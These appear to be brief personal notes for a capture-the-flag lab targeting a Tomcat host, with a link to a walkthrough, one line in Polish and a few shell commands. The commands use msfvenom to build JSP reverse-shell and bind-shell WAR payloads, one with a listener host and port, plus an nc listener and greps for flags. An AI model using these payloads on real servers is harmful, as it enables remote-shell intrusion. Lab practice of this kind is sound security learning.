# Charlie notes

https://medium.com/@z6157881/my-tomcat-host-1-walkthrough-vulnhub-d267b36db003

grep -r "flag" .

Nie ma w /usr/ ani w /home

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.128.161.2 LPORT=4444 -f war > shell-10-128-161-2-4444.war
```

```bash
nc -lvnp 4444
```

```bash
msfvenom -p java/jsp_shell_bind_tcp -f war > bind-tcp.war
```

```bash
grep -r 'flag{' /etc/ > /tmp/flag.txt &
```